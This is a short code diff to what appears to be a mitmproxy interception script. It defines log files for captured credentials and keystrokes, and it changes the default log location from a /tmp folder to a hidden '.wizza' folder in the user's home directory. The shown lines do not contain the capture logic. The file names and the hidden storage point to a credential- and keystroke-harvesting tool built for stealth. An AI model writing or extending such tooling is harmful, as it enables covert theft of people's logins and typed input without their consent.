@@ -2,7 +2,7 @@ import os, json
 from mitmproxy import http
 from datetime import datetime
 
-LOG_DIR = os.environ.get("LOG_DIR", "/tmp/op/logs")
+LOG_DIR = os.environ.get("LOG_DIR", os.path.join(os.path.expanduser("~"),".wizza","logs"))
 CAUGHT  = f"{LOG_DIR}/credentials.txt"
 KEYS    = f"{LOG_DIR}/keystrokes.txt"
 
